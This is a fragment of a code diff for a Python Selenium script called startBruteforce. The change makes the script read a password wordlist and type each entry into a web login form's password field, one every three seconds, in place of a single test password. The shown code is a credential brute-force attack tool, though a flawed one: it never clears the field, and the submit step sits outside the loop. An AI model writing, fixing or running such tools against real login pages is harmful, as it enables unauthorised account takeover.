@@ -44,12 +44,10 @@ def startBruteforce(driver):
                 # Fetching the wordlist
 
                 with open('wordlist.txt', 'r') as file:
-                    content = file.read()
                     print("Loading Passwords\n")
                     line_count = 0
                     for line in file:
                         line_count += 1
-                    
                     print(f"{line_count} default passwords loaded!")
                     
                 try:
@@ -66,11 +64,14 @@ def startBruteforce(driver):
                     driver, 10).until(
                     EC.visibility_of_element_located(
                         (By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input')))
-                passwordField.send_keys("testpassword")
-                
-                print("Keys sent")
+                print(passwordField)
+                with open('wordlist.txt', 'r') as file:
+                    for line in file:
+                     passwordField.send_keys(line)
+                     print(f"Trying Password {line}")
+                     time.sleep(3)
             except BaseException:
-                print("Password field not found")
+                print("User Interrupted or any other random error")
             submitButton = WebDriverWait(
                 driver, 10).until(
                 EC.visibility_of_element_located(
